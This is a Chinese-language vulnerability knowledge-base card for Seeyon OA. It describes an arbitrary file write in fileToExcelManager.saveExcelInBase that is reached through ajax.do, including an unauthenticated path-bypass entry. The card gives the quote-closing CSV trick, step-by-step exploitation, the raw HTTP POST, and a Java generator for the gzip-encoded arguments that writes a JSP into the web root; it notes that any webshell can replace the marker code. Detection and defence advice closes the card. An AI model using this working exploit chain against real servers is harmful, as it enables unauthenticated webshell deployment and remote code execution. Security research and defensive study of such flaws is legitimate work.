---
id: web-java-component-seeyon-filetoexcelmanager-saveexcelinbase-arbitrary-file-write-jsp
title: 致远 OA fileToExcelManager.saveExcelInBase 任意文件写入：filePath 不校验，CSV 双引号包裹用换行闭合写 JSP WebShell
type: scenario
domain: web
path: web/java/component
technique: seeyon-filetoexcelmanager-saveexcelinbase-arbitrary-write-jsp
tags:
- java
- seeyon
- oa
- ajax
- arbitrary-file-write
- path-traversal
- csv
- jsp
- webshell
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V652
  verified_at: '2026-11-13T05:08:55+08:00'
  notes: 已对照原文与截图核对：saveExcelInBase(String filePath, String fileName, DataRecord dataRecords) 方法签名、columnName/cell 双引号 CSV 拼接、new File(filePath)+FileOutputStream 写 BOM(-17,-69,-65)、Payload 生成器源码、POST /seeyon/autoinstall.do/../ajax.do 响应 200 Content-Length 4 且 body=null、访问 /x.jsp 执行输出，均与截图一致。affected_versions：原文仅写"本次分析版本v7.1sp1"，属分析/测试环境版本、无受影响区间表述，按约定 clear（未猜）。dedup：xrdController 候选 likely_duplicate 但入口（登录后 checkIsSign 文件复制覆盖 vs ajax.do 反射调用 new 写入）、触发条件与 sink 均不同，非同链，保留为关联；dup-scan 无涉及本卡 pair。修正：删除无原文依据的"原文环境为致远 JetSpeed 目录"表述。未验证点：未执行 PoC（arguments 依赖致远内部 ZipUtil/DataRecord 生成）。
url: /docs/web/java/component/web-java-component-seeyon-filetoexcelmanager-saveexcelinbase-arbitrary-file-write-jsp/
draft: false
kb_aliases:
- 致远OA saveExcelInBase 任意文件写入
- FileToExcelManagerImpl
- fileToExcelManager 写 JSP
- 致远 OA ajax.do 文件上传 getshell
- CSV 双引号闭合写 shell
- filePath 路径穿越写 webshell
---

## 一句话结论

致远 OA 的 `FileToExcelManagerImpl.saveExcelInBase(String filePath, String fileName, DataRecord dataRecords)` 对第一个参数 `filePath` 不做任何路径/后缀校验，直接 `new File(filePath)` 并用 `FileOutputStream` 覆盖写入 CSV 文本；写入内容是逗号分隔、每个字段被双引号包裹的 CSV，攻击者把首列列名设为 `"` + 回车换行 + JSP 代码 + `"` + 回车换行，即可闭合方法自动添加的外层引号，让 JSP 代码独占一行写入 `../webapps/ROOT/x.jsp`，访问即执行，形成 RCE。

## 原理

- **sink 方法**：`FileToExcelManagerImpl.saveExcelInBase` 接收 `(String filePath, String fileName, DataRecord dataRecords)`，`dataRecords == null` 时抛异常，否则用 `StringBuilder` 手工拼 CSV：
  - 列名：每个 `columnName[k]` 前后各 `str.append("\"")`，列间加 `,`；
  - 数据行：行间 `\r\n`，每个 cell 的 `toCsvString(content)` 前后也各加 `"`，cell 间加 `,`。
- **写入文件不校验**：`File file = new File(filePath);` 之后若不存在则 `getParentFile().mkdir()` + `createNewFile()`，再 `FileOutputStream out_ = new FileOutputStream(file); out_.write(new byte[]{-17,-69,-65});`（UTF-8 BOM）`out_.write(str.toString().getBytes("UTF-8")); out_.flush(); out_.close();`。`filePath` 全程来自调用方参数，可含 `../`，可指向 Web 根目录；`fileName` 参数不参与路径校验。
- **双引号包裹问题与闭合**：JSP 片段若直接作为列名/单元格内容，会被方法前后加上 `"`，JSP 代码处在引号包围的 CSV 字符串中不会被容器当作脚本解析。把值构造为 `"\r\n<JSP代码>"\r\n`：外层的第一个 `"` 与方法添加的前引号形成 `""`（空字段），`\r\n` 结束该 CSV 行；JSP 代码从新行开始且前面没有引号；末尾的 `"` + `\r\n` 让方法追加的后引号落在独立行，不污染 JSP 行。最终文件形如 BOM + `""` + 换行 + `<% ... %>` + 换行 + `"`，JSP 行独立且可编译。
- **触发入口**：`ajax.do` 的 `invokeService` 支持 `managerName`/`managerMethod`/`arguments`（gzip+URL 编码的 JSON 数组）反射调用任意 bean 的 public 方法。指定 `managerName=fileToExcelManager`、`managerMethod=saveExcelInBase`，`arguments` 为 `["../webapps/ROOT/x.jsp", "\"\"", {"columnName":[...]}]` 即可到达 sink；入口可为未授权 `/autoinstall.do/../ajax.do`（见关联卡），也可为任意可访问 ajax.do 的会话。
- **为什么能 RCE**：写入目标是容器 Web 根目录下的 `.jsp`，JSP 由容器编译执行，代码在应用进程权限下运行；原文写入后直接访问 `http://target/x.jsp` 输出了 JSP 中的字符串，证明执行。

## 触发条件

- 目标为存在 `fileToExcelManager` bean 的致远 OA；原文分析版本 v7.1sp1。
- 能访问 `ajax.do` 的 `ajaxAction`（未授权绕过或已登录会话均可）。
- 应用进程对目标写入路径（如 `../webapps/ROOT/`）有写权限。
- `arguments` 压缩编码格式与目标版本 `ZipUtil.uncompressRequest` 兼容（见 PoC 说明）。

## 利用步骤

1. 构造 `DataRecord`：`setColumnName(new String[]{"\"\r\n<% out.println(\"ttttttttt\"); %>\"\r\n"})`（JSP 代码可替换为任意 WebShell 内容）。
2. 组装参数数组：`["../webapps/ROOT/x.jsp", "\"\"", dataRecord]`，`JSONUtil.toJSONString` 序列化后，用致远 `ZipUtil.compressResponse(json, "gzip", "UTF-8", LOGGER)` 压缩成字符串，再 `URLEncoder.encode` 得到 `arguments`。
3. 发送 POST（未授权入口版本）：

   ```http
   POST /seeyon/autoinstall.do/../ajax.do?method=ajaxAction&managerName=fileToExcelManager HTTP/1.1
   Host: target
   Content-Type: application/x-www-form-urlencoded

   managerMethod=saveExcelInBase&managerName=fileToExcelManager&method=ajaxAction&requestCompress=gzip&arguments=<URLEncoder(gzip(JSON))>
   ```

4. 响应 HTTP 200、`Content-Type: application/json`、响应体 `null`（原文 Content-Length 4）表示反射调用完成、文件已写入。
5. 访问 `http://target/x.jsp` 验证 JSP 执行（原文页面输出 `ttttttttt`）。

## PoC

原文 Java 生成器（依赖致远内部类 `DataRecord`/`ZipUtil`/`JSONUtil`/`CtpLogFactory`）：

```java
DataRecord d = new DataRecord();
String[] c = {"\"\r\n" + "<% out.println(\"ttttttttt\"); %>" + "\"\r\n"};
d.setColumnName(c);
String dd = JSONUtil.toJSONString(d);
ArrayList<Object> list = new ArrayList<>();
list.add("../webapps/ROOT/x.jsp");
list.add("\"\"");
list.add(d);
String list1 = JSONUtil.toJSONString(list);
String strArgs = ZipUtil.compressResponse(list1, "gzip", "UTF-8", LOGGER);
System.out.println(URLEncoder.encode(strArgs));
```

请求体特征（原文）：

```text
managerMethod=saveExcelInBase&managerName=fileToExcelManager&method=ajaxAction&requestCompress=gzip&arguments=%1F%C2%8B%08...
```

注意：

- `arguments` 不能直接用标准 gzip 输出：致远 `ZipUtil.compressResponse/ uncompressRequest` 是 gzip 字节按单字节字符（ISO-8859-1 风格）转字符串再 URL 编码，请求中可见 `%C2%8B` 这类 UTF-8 双字节编码；需复刻其转换或用原工具类生成。
- 写入路径相对应用工作目录（原文未说明具体部署目录），按目标部署结构调整 `../webapps/ROOT/` 前缀。
- 方法添加的 BOM `EF BB BF` 在文件头，不影响 JSP 行解析。

## 变体与关联

- 关联：[[web-java-component-seeyon-ajaxdo-needless-urlmap-path-normalization-auth-bypass]]（未授权进入 ajax.do 的路径绕过，本卡的上游入口）。
- 关联：[[web-java-component-seeyon-ajaxdo-formulamanager-groovy-file-write-jsp]]（同一 ajax.do 反射分发入口的另一条写 JSP 链，sink 为 formulaManager 的 Groovy 注入）。
- 关联：[[web-java-component-seeyon-xrdcontroller-checkissign-file-copy-traversal]]（同产品另一条“路径穿越落 JSP”链，但其入口为登录后 xrdController.checkIsSign 的文件复制覆盖、需先上传占位文件；本卡为 ajax.do 直达 saveExcelInBase 新建写入，入口与 sink 均不同，非同链）。
- 变体：除 `saveExcelInBase` 外，其他接收文件路径参数的 Manager 方法（导出、模板、日志等）可能存在同类任意写点；`fileName` 参数在本方法中未参与校验，也提示同族方法可能有类似缺陷。
- 变体：CSV 内容可写任意 JSP/脚本；若目标禁用 JSP，可考虑写配置文件或其他可执行落点（需另证）。
- 边界：写路径与 Web 根相对位置随部署不同；原文仅在 v7.1sp1 实测，其他版本需重新确认方法签名与参数个数（反射按参数个数匹配）。

## 检测与防御

- 检测：`ajax.do` 请求出现 `managerName=fileToExcelManager`、`managerMethod=saveExcelInBase`；解压后的 `arguments` 含 `../webapps/ROOT`、`.jsp`、`<%`、`\r\n` 等特征。
- 检测：Web 根目录新增或改写的 `.jsp` 文件，尤其文件头为 UTF-8 BOM 且内容形如 CSV（引号、逗号）的异常文件。
- 防御：升级官方修复版本；`saveExcelInBase` 限定导出基目录并对 `filePath` 做规范化后的前缀校验，禁止 `..` 与脚本后缀。
- 防御：应用进程对 Web 目录只读，JSP 文件完整性监控；`ajax.do` 的 Manager 与方法改为白名单，限制 `fileToExcelManager` 等管理 bean 的调用角色。
